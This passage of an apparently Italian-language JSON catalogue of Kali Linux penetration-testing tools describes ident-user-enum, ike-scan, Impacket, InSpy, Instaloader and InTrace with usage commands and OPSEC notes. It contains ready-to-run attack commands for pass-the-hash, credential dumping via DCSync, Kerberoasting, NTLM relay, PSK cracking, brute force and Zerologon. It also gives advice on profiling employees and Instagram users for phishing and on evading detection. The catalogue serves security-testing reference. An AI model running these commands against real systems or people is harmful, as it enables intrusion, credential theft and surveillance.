      "AD_Windows",
      "Toolkits"
    ],
    "notes": null
  },
  {
    "id": "ident-user-enum",
    "name": "ident-user-enum",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ident-user-enum/",
    "desc": "Enumera username su sistemi che espongono ident service (porta 113) via TCP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ident-user-enum</strong> è un tool per enumerare username su sistemi che espongono il servizio Ident (RFC 1413) sulla porta TCP 113. Il protocollo Ident, originariamente progettato per identificare l'utente proprietario di una connessione TCP, risponde con lo username del processo che ha stabilito una specifica connessione. Sebbene largamente deprecato per ragioni di sicurezza, il servizio è ancora presente su alcuni sistemi Unix/Linux legacy, server IRC e ambienti non aggiornati. Quando disponibile, fornisce username validi utili per attacchi di brute force successivi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Username Discovery via Ident:</strong> interroga il servizio Ident per ottenere lo username associato a connessioni TCP attive su porte specifiche, rivelando account utente validi sul sistema target.</p><p><strong>Port-to-User Correlation:</strong> associa username agli specifici servizi/porte su cui sono attive connessioni, fornendo insight su quali utenti gestiscono quali servizi (es. www-data per porta 80, mysql per 3306).</p><p><strong>Multi-Port Batch Testing:</strong> testa simultaneamente multiple porte su uno o più host per massimizzare l'enumerazione degli username in ambienti con servizi diversi.</p><p><strong>Structured Output:</strong> genera lista pulita di username trovati facilmente utilizzabile come input per tool di brute force come Hydra o Medusa.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera utente sulla porta SSH (22)\nident-user-enum target.com 22\n\n# Test su multiple porte comuni\nident-user-enum target.com 22,25,80,110,143,443\n\n# Scan di lista host\ncat hosts.txt | while read h; do ident-user-enum $h 22; done\n\n# Prima verifica se Ident è attivo\nnmap -p 113 target.com\n\n# Workflow completo:\n# 1. Identifica host con porta 113 aperta\nnmap -p 113 --open 192.168.1.0/24 -oG - | grep \"113/open\"\n\n# 2. Enumera username su host con Ident\nfor ip in $(cat ident_hosts.txt); do\n  echo \"=== $ip ===\"\n  ident-user-enum $ip 22,80,443\ndone\n\n# 3. Usa username trovati per brute force\nhydra -L found_users.txt -P passwords.txt ssh://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Username Enumeration</strong>, scoprire account utente validi sul sistema target da utilizzare in attacchi di brute force, password spraying o social engineering.</p><p>Per <strong>Legacy System Assessment</strong>, durante audit di sicurezza su infrastrutture datate dove Ident potrebbe essere ancora attivo e non configurato correttamente.</p><p>Per <strong>Service-User Mapping</strong>, identificare quali utenti eseguono quali servizi per comprendere la configurazione del sistema e identificare potenziali vettori di escalation.</p><p>Per <strong>IRC Server Testing</strong>, i server IRC spesso richiedono e utilizzano Ident - utile per testing di infrastrutture IRC.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Low Footprint:</strong> le query Ident sono richieste TCP standard alla porta 113, generano traffico minimo e sono raramente monitorate o loggate. Tuttavia, il servizio è raro su sistemi moderni - la porta 113 chiusa o filtrata è la norma. Utile principalmente in contesti legacy, ambienti Unix datati o server IRC. Quando funziona, fornisce informazioni gratuite senza detection.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "Porta_113"
    ],
    "notes": null
  },
  {
    "id": "ike-scan",
    "name": "ike-scan",
    "version": "1.9.5",
    "icon": "../app/icons/ike-scan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ike-scan/",
    "desc": "Scopre e fingerprint gateway VPN IPsec analizzando risposte IKE e transform set.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>IKE-scan</strong> è lo strumento di riferimento per discovery e fingerprinting di gateway VPN IPsec. Invia pacchetti IKE (Internet Key Exchange) Phase 1 sulla porta UDP 500 e analizza le risposte per identificare vendor, versione del software VPN e transform set supportati (algoritmi di cifratura, hash, gruppi Diffie-Hellman). È essenziale per assessment di sicurezza di infrastrutture VPN, identificazione di configurazioni deboli o deprecate, e mappatura del perimetro di rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>VPN Gateway Discovery:</strong> identifica gateway IKE attivi su singoli host o range di IP, determinando quali sistemi offrono servizi VPN IPsec e rispondono a negoziazioni IKE.</p><p><strong>Vendor Fingerprinting:</strong> analizza le risposte IKE per identificare il vendor (Cisco, Checkpoint, Juniper, Fortinet, etc.) e spesso la versione specifica del software VPN tramite pattern nelle risposte e Vendor ID payload.</p><p><strong>Transform Set Enumeration:</strong> enumera i cipher suite supportati testando combinazioni di encryption (3DES, AES), hash (MD5, SHA), authentication (PSK, RSA) e gruppi DH per identificare configurazioni deboli.</p><p><strong>Aggressive Mode Testing:</strong> testa se il gateway supporta Aggressive Mode che può rivelare informazioni sensibili come group names, permettendo attacchi di tipo PSK cracking offline.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base di un gateway VPN\nike-scan target.com\n\n# Aggressive mode (rivela più informazioni, incluso group name)\nike-scan -A target.com\n\n# Con transform set specifico (enc, hash, auth, group)\nike-scan --trans=5,2,1,2 target.com\n\n# Scan di un range per discovery VPN\nike-scan 192.168.1.0/24\n\n# Mostra vendor ID decodificati\nike-scan -v target.com\n\n# Specificando source port\nike-scan -sport=500 target.com\n\n# Con ID specifico per aggressive mode\nike-scan -A --id=vpngroup target.com\n\n# Output dettagliato per fingerprinting\nike-scan -v -v target.com\n\n# Workflow per PSK cracking:\n# 1. Test aggressive mode\nike-scan -A -v target.com\n# 2. Se risponde, cattura handshake\nike-scan -A --id=groupname -P target.com\n# 3. Crack PSK con psk-crack o hashcat</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>VPN Security Assessment</strong>, valutare la configurazione di sicurezza dei gateway VPN identificando cipher deboli (DES, MD5), Aggressive Mode esposto e versioni software vulnerabili.</p><p>Per <strong>Perimeter Reconnaissance</strong>, mappare tutti i gateway VPN esposti sul perimetro di un'organizzazione durante la fase di reconnaissance di un penetration test.</p><p>Per <strong>PSK Attack Preparation</strong>, identificare VPN che supportano Aggressive Mode per catturare handshake e tentare cracking offline delle Pre-Shared Key.</p><p>Per <strong>Compliance Verification</strong>, verificare che le configurazioni VPN rispettino policy di sicurezza (no cipher deprecati, no Aggressive Mode, etc.).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active Scanning:</strong> genera pacchetti IKE verso porta UDP 500 che sono facilmente loggati da firewall e IDS. Aggressive Mode rivela informazioni anche sul client (source). Il pattern di scansione è riconoscibile. Range scan genera molto traffico. Usare con cautela e autorizzazione durante penetration test.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "impacket-scripts",
    "name": "impacket-scripts",
    "version": "1.1",
    "icon": "../app/icons/impacket-scripts-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/impacket-scripts/",
    "desc": "Wrapper e script aggiuntivi per semplificare l'uso degli script Impacket.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Impacket-scripts</strong> è un pacchetto che fornisce wrapper e script di convenienza per semplificare l'utilizzo della potente libreria Impacket. Include interfacce command-line pronte all'uso per tutte le operazioni comuni: autenticazione Windows, esecuzione remota, dump di credenziali, attacchi Kerberos e manipolazione di protocolli Windows. Permette di eseguire operazioni complesse senza dover scrivere codice Python custom, rendendo Impacket accessibile direttamente dalla shell.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Ready-to-Use Wrappers:</strong> interfacce command-line che wrappano gli script Python di Impacket con parsing degli argomenti, help integrato e gestione degli errori, utilizzabili direttamente come comandi di sistema.</p><p><strong>Common Operation Scripts:</strong> script preconfigurati per operazioni frequenti durante penetration test: remote execution (psexec, wmiexec, smbexec), credential dumping (secretsdump), Kerberos attacks (GetUserSPNs, GetNPUsers), e altro.</p><p><strong>Pipeline Integration:</strong> output strutturato e exit code appropriati che facilitano l'integrazione in script bash, pipeline di automazione e workflow di penetration testing.</p><p><strong>Consistent Interface:</strong> sintassi uniforme per tutti gli script (domain/user:password@target o -hashes per pass-the-hash) che semplifica l'apprendimento e l'uso.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Remote shell via PSExec (crea servizio temporaneo)\nimpacket-psexec domain/admin:Password123@192.168.1.100\n\n# Remote shell via WMI (più stealth, no servizio)\nimpacket-wmiexec domain/admin:Password123@192.168.1.100\n\n# Con hash NTLM invece di password (pass-the-hash)\nimpacket-psexec -hashes aad3b435b51404ee:8846f7eaee8fb117 domain/admin@target\n\n# Dump credenziali da DC (SAM, LSA, NTDS)\nimpacket-secretsdump domain/admin:Password123@dc01.domain.local\n\n# Kerberoasting - estrai hash SPN\nimpacket-GetUserSPNs domain/user:password -dc-ip 10.10.10.1 -request\n\n# AS-REP Roasting - utenti senza preauth\nimpacket-GetNPUsers domain/ -usersfile users.txt -dc-ip 10.10.10.1\n\n# Esegui comando singolo via SMBExec\nimpacket-smbexec domain/admin:Password123@target \"whoami /all\"\n\n# NTLM Relay attack\nimpacket-ntlmrelayx -t ldaps://dc.domain.local --escalate-user lowpriv\n\n# Silver Ticket\nimpacket-ticketer -nthash HASH -domain-sid S-1-5-21-... -domain domain.local -spn HTTP/web admin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Active Directory Penetration Testing</strong>, eseguire rapidamente operazioni comuni di attacco AD (lateral movement, credential dumping, Kerberos attacks) senza dover scrivere codice Python.</p><p>Per <strong>Quick Operations</strong>, lanciare comandi remoti, dump di credenziali o test specifici con una singola linea di comando durante un engagement.</p><p>Per <strong>Learning Impacket</strong>, approccio semplificato per imparare le funzionalità di Impacket prima di passare alla scrittura di script custom.</p><p>Per <strong>Automation &amp; Scripting</strong>, integrare operazioni Impacket in script bash e pipeline di automazione per penetration testing su larga scala.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> stesse considerazioni di Impacket - il traffico SMB/RPC è monitorato da EDR moderni. Ogni autenticazione genera Event ID 4624/4625. PSExec crea servizi temporanei (Event 7045). SecretsDump genera pattern specifici. Le signature degli script Impacket sono note ai vendor di sicurezza. Considerare tecniche di evasion per ambienti monitorati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Toolkits"
    ],
    "notes": null
  },
  {
    "id": "impacket",
    "name": "impacket",
    "version": "0.12.0",
    "icon": "../app/icons/impacket-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/impacket/",
    "desc": "Libreria Python per protocolli di rete Windows: SMB, MSRPC, NTLM, Kerberos, WMI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Impacket</strong> è LA libreria Python per lavorare con protocolli di rete Windows. Include implementazioni complete di SMB, MSRPC, NTLM, Kerberos, WMI, LDAP e altri. Fornisce script pronti all'uso per attacchi AD comuni: secretsdump, psexec, wmiexec, GetNPUsers, GetUserSPNs e molti altri.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Protocol Suite:</strong> SMB1/2/3, MSRPC, Kerberos, NTLM.</p><p><strong>Ready Scripts:</strong> 50+ script per attacchi AD.</p><p><strong>Credential Attacks:</strong> Pass-the-hash, Kerberoasting, AS-REP roasting.</p><p><strong>Remote Execution:</strong> PSExec, WMIExec, SMBExec, AtExec.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Secretsdump con tutti i metodi (SAM, LSA, NTDS)\nimpacket-secretsdump -just-dc-ntlm domain/admin:password@dc.target.com -outputfile ntds_dump\n\n# DCSync attack per target specifico\nimpacket-secretsdump -just-dc-user krbtgt domain/admin@dc.target.com\n\n# Remote shell via diversi protocolli\nimpacket-psexec domain/admin@target -hashes aad3b:ntlmhash  # SMB\nimpacket-wmiexec domain/admin@target -hashes aad3b:ntlmhash # WMI (stealthier)\nimpacket-smbexec domain/admin@target -hashes aad3b:ntlmhash # SMB senza service\nimpacket-atexec domain/admin@target -hashes aad3b:ntlmhash \"whoami\" # Task Scheduler\n\n# Kerberoasting con output hashcat\nimpacket-GetUserSPNs domain/user:password -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt\nhashcat -m 13100 kerberoast.txt wordlist.txt\n\n# Silver Ticket attack\nimpacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/sql.domain.local admin\n\n# NTLM relay su LDAP per addComputer\nimpacket-ntlmrelayx -t ldaps://dc.domain.local --add-computer EVIL$ Password123\n\n# Zerologon check e exploit\nimpacket-zerologon dc01 domain.local</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Pentesting</strong>, toolkit essenziale per attacchi.</p><p>Nel <strong>Red Team</strong>, lateral movement e privilege escalation.</p><p><strong>Credential Harvesting</strong> e persistence.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Molto Rilevabile:</strong> Traffico SMB/RPC monitoato da EDR. Event 4624/4625 per login. Secretsdump genera eventi specifici. Signatrue degli script note.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Toolkits"
    ],
    "notes": null
  },
  {
    "id": "inspy",
    "name": "inspy",
    "version": "3.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/inspy/",
    "desc": "OSINT LinkedIn per enumerare dipendenti, ruoli e tecnologie usate da un'azienda.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>InSpy</strong> e uno strumento OSINT specializzato nell'enumerazione di informazioni aziendali tramite LinkedIn, progettato per estrarre dati su dipendenti, ruoli organizzativi e stack tecnologici di un'organizzazione target. Il tool opera effettuando ricerche mirate su LinkedIn per raccogliere nomi, posizioni lavorative e competenze tecniche dei dipendenti di un'azienda specifica, costruendo un profilo dettagliato dell'organizzazione senza interagire direttamente con l'infrastruttura IT del target. Le informazioni raccolte sono preziose per molteplici fasi di un engagement di sicurezza: la lista dei dipendenti puo essere utilizzata per generare possibili username e indirizzi email per attacchi di password spraying, i ruoli organizzativi identificano figure chiave per campagne di social engineering mirate, e le tecnologie menzionate nei profili e nelle offerte di lavoro rivelano lo stack tecnologico dell'azienda, contribuendo alla mappatura della superficie di attacco.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Enumerazione Dipendenti (EmpSpy):</strong> La modalita EmpSpy di InSpy ricerca sistematicamente i profili LinkedIn associati all'azienda target, estraendo nomi completi, titoli professionali e posizioni lavorative. Utilizzando una wordlist di titoli comuni (CEO, CTO, Developer, Administrator), il tool costruisce una mappa dell'organigramma aziendale che rivela la struttura gerarchica, i dipartimenti esistenti e le figure chiave dell'organizzazione. Questi dati sono fondamentali per identificare target ad alto valore per attacchi di spear phishing e per generare liste di username basate sui pattern nominali dell'azienda.</p><p><strong>Ricognizione Tecnologica (TechSpy):</strong> La modalita TechSpy analizza le offerte di lavoro e i profili dei dipendenti dell'azienda target per identificare le tecnologie, i framework e gli strumenti menzionati. Questo approccio passivo rivela informazioni sullo stack tecnologico che normalmente richiederebbero scansioni attive dell'infrastruttura: linguaggi di programmazione utilizzati, database, piattaforme cloud, sistemi operativi, strumenti di sicurezza e molto altro. Queste informazioni guidano la selezione di exploit e tecniche di attacco specifiche per le tecnologie in uso.</p><p><strong>Generazione Username e Output Strutturato:</strong> InSpy puo generare automaticamente liste di possibili username basandosi sui nomi dei dipendenti trovati e sui pattern nominali comuni nelle aziende (nome.cognome, n.cognome, iniziale+cognome). L'output puo essere salvato in formato testuale strutturato, pronto per essere utilizzato come input per tool di password spraying come Spray o Ruler, o per la verifica dell'esistenza degli account tramite SMTP enumeration o Azure AD enumeration.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>InSpy richiede accesso a LinkedIn per le ricerche. L'efficacia dipende dalla quantita di informazioni pubbliche disponibili sui profili dei dipendenti dell'azienda target.</p><pre><code># Enumerazione dipendenti dell'azienda target\ninspy --empspy --company \"Target Corporation\"\n\n# Ricerca tecnologie utilizzate dall'azienda\ninspy --techspy --company \"Target Corporation\"\n\n# Salvataggio risultati su file\ninspy --empspy --company \"Target Corp\" --output employees.csv\n\n# Utilizzo di wordlist personalizzata per ruoli\ninspy --empspy --company \"Target Corp\" --wordlist custom_titles.txt\n\n# Wordlist tecnologie personalizzata\ninspy --techspy --company \"Target Corp\" --wordlist technologies.txt\n\n# Combinazione di entrambe le modalita\ninspy --empspy --techspy --company \"Target Corp\" --output full_recon.csv</code></pre><p>E importante utilizzare il tool con moderazione per evitare il ban dell'account LinkedIn. Intervallare le ricerche con pause e limitare il numero di query per sessione. Per risultati piu completi, considerare l'uso di account LinkedIn Premium.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>OSINT e Pre-Engagement</strong>, InSpy viene utilizzato per costruire un profilo dettagliato dell'organizzazione target prima di qualsiasi interazione diretta con la sua infrastruttura. La mappa dei dipendenti, dei ruoli e delle tecnologie fornisce un contesto prezioso per pianificare le fasi successive dell'assessment, identificando i vettori di attacco piu promettenti e le figure chiave da targetizzare.</p><p>Per campagne di <strong>Social Engineering e Spear Phishing</strong>, le informazioni raccolte da InSpy permettono di costruire pretesti credibili e personalizzati. Conoscere il nome del CTO, i progetti in corso e le tecnologie in uso permette di crafting email di phishing altamente convincenti che fanno riferimento a contesti reali dell'azienda, aumentando drasticamente le probabilita di successo della campagna.</p><p>Durante la fase di <strong>Username Enumeration e Password Spraying</strong>, la lista dei dipendenti viene trasformata in potenziali username e indirizzi email che vengono poi verificati contro i servizi esposti dell'azienda (OWA, VPN, Azure AD). Gli username validi diventano target per attacchi di password spraying con password comuni o stagionali, un vettore di accesso iniziale estremamente efficace nelle organizzazioni con policy di password deboli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> InSpy effettua ricerche su LinkedIn, non sull'infrastruttura del target, quindi l'azienda target non riceve alcuna notifica diretta dell'attivita di ricognizione. Tuttavia, LinkedIn monitora pattern di scraping automatizzato e puo bloccare o limitare l'account utilizzato. L'attivita di scraping viola i termini di servizio di LinkedIn e potrebbe avere implicazioni legali in alcune giurisdizioni.</p><p><strong>Impatto operativo:</strong> I risultati dipendono dalla quantita di informazioni pubblicamente disponibili su LinkedIn, che varia significativamente tra aziende e settori. Account LinkedIn gratuiti hanno limiti di visualizzazione profili che possono ridurre l'efficacia del tool. Le informazioni potrebbero essere non aggiornate se i dipendenti non mantengono attivi i loro profili. Il tool potrebbe non funzionare correttamente se LinkedIn modifica la struttura delle pagine web.</p><p><strong>Mitigazioni:</strong> Utilizzare un account LinkedIn dedicato e separato dall'identita personale dell'operatore. Implementare pause tra le ricerche per simulare comportamento umano ed evitare il ban. Combinare con altre fonti OSINT (Hunter.io, Phonebook.cz, GitHub) per validare e completare i risultati. Documentare la fonte di ogni dato raccolto per il report finale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "People_Search"
    ],
    "notes": null
  },
  {
    "id": "instaloader",
    "name": "instaloader",
    "version": "4.14.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/instaloader/",
    "desc": "Scarica foto, video, storie e metadati da profili Instagram per OSINT social.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Instaloader</strong> è lo strumento Python di riferimento per il download automatizzato di contenuti da Instagram, progettato specificamente per operazioni OSINT e preservazione delle prove digitali. A differenza di semplici downloader, Instaloader estrae non solo media (foto, video, storie, reels, IGTV, highlights) ma anche tutti i metadati associati: caption, timestamp, geolocalizzazione, hashtag, menzioni, commenti e informazioni sui follower. Supporta sia profili pubblici che privati (con autenticazione), mantenendo la struttura originale dei dati per analisi forensi. Il tool gestisce automaticamente il rate limiting di Instagram, riprende download interrotti e può monitorare profili per nuovi contenuti nel tempo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Complete Content Extraction:</strong> Scarica tutti i tipi di contenuto Instagram: post del feed (foto singole, carousel, video), storie (incluse quelle in evidenza/highlights), reels, IGTV, tagged posts e saved posts. Per ogni elemento preserva la massima risoluzione disponibile e tutti i metadati associati in formato JSON strutturato per analisi successiva.</p><p><strong>Metadata Intelligence:</strong> Estrae informazioni critiche per OSINT: geotag con coordinate GPS, timestamp esatti di pubblicazione, lista completa di hashtag e menzioni, conteggio like e commenti, caption originali con eventuali modifiche. Permette di ricostruire timeline di attività, pattern di comportamento e network di contatti del target.</p><p><strong>Authentication & Private Access:</strong> Supporta login con credenziali Instagram per accedere a profili privati (se si è follower), storie, close friends content e propri saved posts. Gestisce sessioni persistenti, two-factor authentication e può usare session file per evitare login ripetuti che potrebbero triggerare security alert.</p><p><strong>Advanced Filtering & Automation:</strong> Filtra contenuti per data, tipo, hashtag o caption con espressioni regolari. Monitora profili per nuovi post con modalità daemon. Supporta download batch di liste di profili, hashtag o location. Resume automatico di download interrotti con state file persistente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Download completo profilo pubblico (post, highlights, tagged)\ninstaloader profile targetuser --highlights --tagged\n\n# Con login per profili privati o storie\ninstaloader --login yourusername profile targetuser --stories\n\n# Session file per evitare login ripetuti\ninstaloader --login yourusername --sessionfile ~/.instaloader-session\n\n# Download con tutti i metadati JSON\ninstaloader --metadata-json --comments profile targetuser\n\n# Solo post in un range di date\ninstaloader profile targetuser --post-filter \"date_utc >= datetime(2024,1,1)\"\n\n# Hashtag con geotag\ninstaloader \"#targetcity\" --geotags\n\n# Location ID (da URL Instagram)\ninstaloader %location_id\n\n# Batch download da file\ninstaloader -f userlist.txt --fast-update\n\n# Monitoring continuo\ninstaloader profile targetuser --fast-update --quiet &</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT Investigation</strong>, Instaloader è fondamentale per raccogliere informazioni complete su target: pattern di vita (quando posta, da dove, con chi), rete di contatti (follower, following, tagged), interessi (hashtag usati, account seguiti). I metadati GPS nelle foto possono rivelare indirizzi di casa/lavoro, luoghi frequentati regolarmente, e viaggi.</p><p>Nella <strong>Digital Evidence Preservation</strong>, permette di salvare contenuti prima che vengano eliminati dal target. Utile in casi legali, investigazioni HR, o monitoraggio di attività sospette. I metadati JSON forniscono chain of custody per prove digitali con timestamp verificabili.</p><p>Per <strong>Social Engineering Preparation</strong>, i contenuti scaricati aiutano a costruire pretesti credibili: hobby del target, luoghi frequentati, amici stretti, eventi recenti. Le foto possono essere analizzate per dettagli come badge aziendali, layout uffici, o informazioni sui sistemi usati.</p><p>Nel <strong>Brand Monitoring & Competitive Intelligence</strong>, monitora account competitor, influencer o brand mentions. Analizza trend di engagement, strategie di contenuto e timing di pubblicazione per benchmarking o threat intelligence su impersonation.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection Surface:</strong> Per profili pubblici senza login, l'attività è essenzialmente passiva (API calls anonime). Con login, Instagram traccia ogni sessione: IP, device fingerprint, pattern di accesso. Scraping aggressivo può triggerare CAPTCHA, temporary lock o permanent ban dell'account usato.</p><p><strong>Rate Limiting:</strong> Instagram implementa rate limiting aggressivo. Instaloader gestisce automaticamente i delay ma download massivi sono comunque rilevabili. Usare --request-timeout e --max-connection-attempts per evitare pattern sospetti. Considerare proxy rotation per operazioni estese.</p><p><strong>Account Security:</strong> Non usare account personali o facilmente riconducibili per login. Creare account dedicati con identità separate, possibilmente aged e con attività organica. Two-factor complica l'automazione ma aumenta la credibilità dell'account.</p><p><strong>Legal Considerations:</strong> Rispettare Terms of Service di Instagram e legislazione locale su privacy e data collection. In molte giurisdizioni, scraping di profili pubblici è legale ma l'uso dei dati potrebbe non esserlo. Documentare l'autorizzazione per penetration test.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Social_Media"
    ],
    "notes": null
  },
  {
    "id": "intrace",
    "name": "intrace",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/intrace/",
    "desc": "Traceroute che usa connessioni TCP esistenti per bypassare firewall statefull.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>InTrace</strong> è uno strumento avanzato di network enumeration che esegue traceroute sfruttando connessioni TCP già stabilite, bypassando così firewall stateful che normalmente bloccano traceroute tradizionale basato su ICMP o UDP. Il principio di funzionamento sfrutta il fatto che i firewall stateful, una volta che una connessione TCP è stabilita e tracciata nella connection table, permettono pacchetti appartenenti a quella sessione. InTrace inietta pacchetti con TTL incrementali nella connessione esistente, ricevendo ICMP Time Exceeded dai router intermedi esattamente come un traceroute normale, ma il traffico viene permesso perché associato a una connessione legittima. Questo permette di mappare l'infrastruttura di rete interna anche quando ICMP è completamente filtrato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TCP Session Hijacking per Traceroute:</strong> InTrace si aggancia a una connessione TCP esistente (identificata da source/dest IP e porte) e inietta pacchetti con TTL modificati. I pacchetti sembrano parte della sessione legittima al firewall, permettendo di attraversare regole che bloccherebbero ICMP Echo Request o UDP probes usati da traceroute tradizionale.</p><p><strong>Stateful Firewall Bypass:</strong> Sfrutta specificamente la logica dei firewall stateful che mantengono connection tracking. Una volta che la connessione TCP è nella state table come ESTABLISHED, i pacchetti InTrace vengono permessi automaticamente. Efficace contro firewall enterprise, UTM e next-gen firewall con ispezione layer 7.</p><p><strong>Passive Connection Detection:</strong> Monitora il traffico di rete per identificare connessioni TCP attive che possono essere utilizzate. Non richiede di stabilire nuove connessioni sospette - può usare sessioni già esistenti come browser web, SSH, o qualsiasi altro traffico TCP legittimo verso il target.</p><p><strong>Path Analysis Attraverso Segmentazione:</strong> Permette di mappare hop intermedi anche attraverso DMZ, VLAN e network segmentation. Rivela router, firewall e load balancer intermedi che non sarebbero visibili con scanning tradizionale. Utile per comprendere architettura di rete difesa in profondità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Step 1: Stabilire una connessione TCP legittima verso target\n# Terminale 1: mantieni connessione attiva\nnc -v target.com 80\nGET / HTTP/1.1\nHost: target.com\n\n# Step 2: Lanciare InTrace sulla connessione esistente\n# Terminale 2:\nsudo intrace -i eth0 -h target.com\n\n# Specificare porta se diversa da default\nsudo intrace -i eth0 -h target.com -p 443\n\n# Con source port specifica (match esatto della connessione)\nsudo intrace -i eth0 -h target.com -p 80 -s 54321\n\n# Aumentare max TTL per reti complesse\nsudo intrace -i eth0 -h target.com -m 40\n\n# Debug mode per troubleshooting\nsudo intrace -i eth0 -h target.com -d\n\n# Usando connessione SSH esistente\nssh user@target.com  # Terminale 1\nsudo intrace -i eth0 -h target.com -p 22  # Terminale 2</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Penetration Testing di Reti Enterprise</strong>, InTrace permette di mappare l'infrastruttura interna anche quando il perimetro blocca completamente ICMP. Durante un assessment, stabilisci una connessione legittima a un servizio esposto (web, email, VPN) e usa InTrace per rivelare router interni, firewall, load balancer e segmentazione di rete non documentata.</p><p>Per <strong>Red Team Infrastructure Mapping</strong>, dopo aver ottenuto accesso iniziale, InTrace aiuta a comprendere la topologia di rete senza generare traffico ICMP sospetto. Identifica chokepoint, firewall interni e percorsi di rete che possono essere sfruttati per lateral movement o per pianificare persistence.</p><p>Durante <strong>Firewall Rule Analysis</strong>, InTrace rivela quali hop sono visibili e quali no, aiutando a comprendere dove sono posizionati i firewall e come sono configurate le regole. La differenza tra traceroute tradizionale (bloccato) e InTrace (funzionante) conferma la presenza di stateful inspection.</p><p>Per <strong>Network Troubleshooting Avanzato</strong>, quando traceroute normale è bloccato ma hai connettività TCP, InTrace permette di diagnosticare problemi di routing, identificare dove i pacchetti vengono droppati e verificare percorsi attraverso infrastrutture complesse con policy firewall restrittive.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection Vectors:</strong> Sebbene più stealth di traceroute tradizionale, InTrace genera pacchetti con pattern TTL anomali (TTL molto bassi in pacchetti data) che sistemi IDS avanzati possono rilevare. I messaggi ICMP Time Exceeded di ritorno sono anche loggabili. Deep Packet Inspection potrebbe identificare l'anomalia.</p><p><strong>Connection Requirements:</strong> Richiede una connessione TCP esistente e stabile. La connessione deve rimanere attiva durante tutto il trace. Se la connessione termina o va in timeout, InTrace fallisce. Preferire connessioni persistenti (SSH, HTTP keep-alive) rispetto a request singole.</p><p><strong>Privilege Requirements:</strong> Richiede privilegi root/administrator per raw socket e packet injection. L'esecuzione con sudo può essere loggata. In ambienti containerizzati potrebbero essere necessarie capabilities specifiche.</p><p><strong>Traffic Anomalies:</strong> I pacchetti iniettati hanno numeri di sequenza che potrebbero non allinearsi perfettamente con il flusso TCP reale. Stack TCP moderni e IDS stateful potrebbero rilevare questa inconsistenza come potenziale session hijacking attempt.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "iodine",
    "name": "iodine",
    "version": "0.7.0",
    "icon": "../app/icons/iodine-logo.svg",
    "installation": "Kali Linux",
